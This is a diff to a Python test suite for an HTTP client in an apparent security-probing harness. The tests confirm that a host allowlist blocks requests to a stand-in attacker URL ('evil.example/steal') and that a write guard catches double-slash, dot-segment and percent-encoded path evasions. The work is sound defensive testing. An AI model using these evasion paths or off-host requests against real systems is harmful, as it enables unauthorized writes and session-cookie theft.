@@ -91,13 +91,94 @@ class _CookieSession:
     is_authenticated = True
 
 
-async def test_session_cookie_not_sent_to_offhost_absolute_url():
-    with respx.mock(assert_all_called=True) as router:
+async def test_offhost_absolute_url_is_blocked_and_carries_no_session():
+    # Strengthened blast-radius: a step naming a foreign host is REFUSED at the client
+    # (never dispatched), so the physician cookie categorically cannot leak off-target —
+    # the request never leaves the process. (Previously the cookie was merely stripped
+    # and the creds-less request still went out; refusing outright is the stronger
+    # control and enforces 'only authorized hosts' mechanically.)
+    with respx.mock(assert_all_called=False) as router:
         route = router.get("https://evil.example/steal").mock(return_value=Response(200, json={}))
         async with TargetClient(agentforge_adapter(BASE), _CookieSession(), _s()) as c:
-            await c.request("GET", "https://evil.example/steal")
-    sent = {k.lower() for k in route.calls.last.request.headers.keys()}
-    assert "cookie" not in sent  # the session cookie was NOT carried to a foreign host
+            resp = await c.request("GET", "https://evil.example/steal")
+    assert resp.status_code == 0
+    assert resp.error == "blocked_by_host_allowlist"
+    assert not route.called  # never dispatched -> the session cookie cannot leak off-host
+
+
+async def test_write_guard_blocks_leading_double_slash_evasion():
+    # //v1/writes parses (naively, via urlsplit) with 'v1' as the netloc and '/writes'
+    # as the path — which would slip a write past the "/v1/writes" prefix guard.
+    # normalized_path collapses the leading slashes so the guard still fires.
+    with respx.mock(assert_all_called=False) as router:
+        r1 = router.post("http://test.local//v1/writes").mock(return_value=Response(200, json={}))
+        r2 = router.post("http://test.local//v1/writes/1/confirm").mock(
+            return_value=Response(200, json={}))
+        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), _s()) as c:
+            resp1 = await c.request("POST", "//v1/writes", json={"x": 1})
+            resp2 = await c.request("POST", "//v1/writes/1/confirm", json={"x": 1})
+    assert resp1.status_code == 0 and resp1.error == "blocked_by_write_guard"
+    assert resp2.status_code == 0 and resp2.error == "blocked_by_write_guard"
+    assert not r1.called and not r2.called  # neither //-evasion was ever dispatched
+
+
+async def test_host_allowlist_allows_the_configured_host():
+    with respx.mock(assert_all_called=True) as router:
+        router.get(f"{BASE}/health").mock(return_value=Response(200, json={}))
+        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), _s()) as c:
+            resp = await c.request("GET", "/health")
+    assert resp.status_code == 200  # the configured target host is always allowed
+
+
+async def test_host_allowlist_widens_only_via_explicit_setting():
+    # A second host is reachable ONLY because the operator explicitly authorized it;
+    # without the setting it is refused (see the off-host test above).
+    with respx.mock(assert_all_called=True) as router:
+        route = router.get("https://second.example/x").mock(return_value=Response(200, json={}))
+        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(),
+                                _s(target_allowlist="second.example")) as c:
+            resp = await c.request("GET", "https://second.example/x")
+    assert resp.status_code == 200 and route.called
+
+
+def test_client_refuses_a_hostless_base_url():
+    # Fail FAST on a misconfigured target rather than dispatch a relative join nowhere.
+    with pytest.raises(ValueError, match="no host"):
+        TargetClient(agentforge_adapter("not-a-url"), AnonymousSession(), _s())
+
+
+async def test_write_guard_blocks_dot_segment_evasion():
+    # httpx applies RFC-3986 dot-segment removal (/v1/./writes, /v1/foo/../writes ->
+    # /v1/writes) BEFORE the wire. The guard must resolve dot-segments too, or a real
+    # authenticated write reaches the target while the guard inspected a different string.
+    with respx.mock(assert_all_called=False) as router:
+        wire = router.post("http://test.local/v1/writes").mock(return_value=Response(200, json={}))
+        confirm = router.post("http://test.local/v1/writes/confirm").mock(
+            return_value=Response(200, json={}))
+        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), _s()) as c:
+            for p in ("/v1/./writes", "/v1/foo/../writes", "/./v1/writes", "/v1/./writes/confirm"):
+                resp = await c.request("POST", p, json={"x": 1})
+                assert resp.status_code == 0 and resp.error == "blocked_by_write_guard", p
+    assert not wire.called and not confirm.called  # no dot-segment form reached the wire
+
+
+async def test_write_guard_blocks_percent_encoded_write():
+    # /v1/writ%65s decodes to /v1/writes on a standard server; the guard percent-decodes
+    # before matching so an encoded write can't slip past (default-deny → fail safe).
+    with respx.mock(assert_all_called=False) as router:
+        wire = router.route(method="POST").mock(return_value=Response(200, json={}))
+        async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), _s()) as c:
+            resp = await c.request("POST", "/v1/writ%65s", json={"x": 1})
+    assert resp.status_code == 0 and resp.error == "blocked_by_write_guard"
+    assert not wire.called
+
+
+async def test_host_allowlist_fails_closed_on_unparseable_authority():
+    # A URL whose authority won't even parse must return a clean block, never an uncaught
+    # exception out of request().
+    async with TargetClient(agentforge_adapter(BASE), AnonymousSession(), _s()) as c:
+        resp = await c.request("GET", "http://[evil/steal")
+    assert resp.status_code == 0 and resp.error == "blocked_by_host_allowlist"
 
 
 async def test_session_cookie_sent_to_configured_host():
@@ -128,6 +209,40 @@ def test_write_probe_seed_with_absolute_url_is_still_detected():
         "steps": [{"kind": "http", "method": "POST",
                    "path": "https://test.local/v1/writes/1/confirm?a=b", "json_body": {"x": 1}}]})
     assert seed.is_write_probe is True
+
+
+def test_write_probe_seed_with_leading_double_slash_is_detected():
+    # Symmetric with the client guard: a //-evasion write path in a hand-authored or
+    # mutated seed must still be flagged so it can never run on a normal campaign.
+    seed = Seed.model_validate({
+        "id": "tm-write-dslash", "category": "tool_misuse", "title": "dslash write",
+        "target_invariant": "INV-WRITE-GATED", "expected_safe": "503/403", "requires_auth": True,
+        "steps": [{"kind": "http", "method": "POST", "path": "//v1/writes",
+                   "json_body": {"x": 1}}]})
+    assert seed.is_write_probe is True
+
+
+def test_write_probe_seed_with_dot_segment_is_detected():
+    # is_write_probe reuses normalized_path, so a dot-segment write (/v1/./writes) in a
+    # mutated seed is caught and excluded — it can't smuggle an authenticated write onto
+    # an ordinary read-only campaign.
+    seed = Seed.model_validate({
+        "id": "tm-write-dot", "category": "tool_misuse", "title": "dot write",
+        "target_invariant": "INV-WRITE-GATED", "expected_safe": "503/403", "requires_auth": True,
+        "steps": [{"kind": "http", "method": "POST", "path": "/v1/./writes",
+                   "json_body": {"x": 1}}]})
+    assert seed.is_write_probe is True
+
+
+def test_write_probe_seed_with_malformed_authority_fails_closed_not_crash():
+    # A malformed absolute-URL path (bad IPv6 bracket) must NOT crash seed loading:
+    # normalized_path is total and fails closed, so the write is still detected/excluded.
+    seed = Seed.model_validate({
+        "id": "tm-write-badhost", "category": "tool_misuse", "title": "bad-authority write",
+        "target_invariant": "INV-WRITE-GATED", "expected_safe": "503/403", "requires_auth": True,
+        "steps": [{"kind": "http", "method": "POST", "path": "http://[::1/v1/writes",
+                   "json_body": {"x": 1}}]})
+    assert seed.is_write_probe is True  # detected, not an exception
 
 
 def test_burst_step_rejects_expensive_endpoints_at_load():
